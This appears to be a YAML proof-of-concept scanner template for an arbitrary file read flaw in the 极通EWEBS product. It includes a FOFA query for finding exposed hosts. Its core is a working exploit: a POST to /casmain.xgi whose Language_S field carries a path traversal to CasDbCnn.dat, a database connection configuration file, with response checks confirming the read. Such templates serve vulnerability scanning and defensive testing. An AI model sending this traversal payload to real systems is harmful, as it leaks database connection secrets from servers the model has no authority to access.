id: poc-yaml-jitong-ewebs-casmain-xgi-file-read
info:
  name: 极通EWEBS casmain.xgi 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 极通EWEBS
  FOFA: app="新软科技-极通EWEBS"
requests:
- method: POST
  path: /casmain.xgi
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: Language_S=../../Data/CONFIG/CasDbCnn.dat
  expression: 'status_code == 200

    && contains(body,"[Edition]")

    && contains(body,"[LocalInfo]")

    && contains(body,"[LicHostPort]")

    '
variables: {}
transport: http
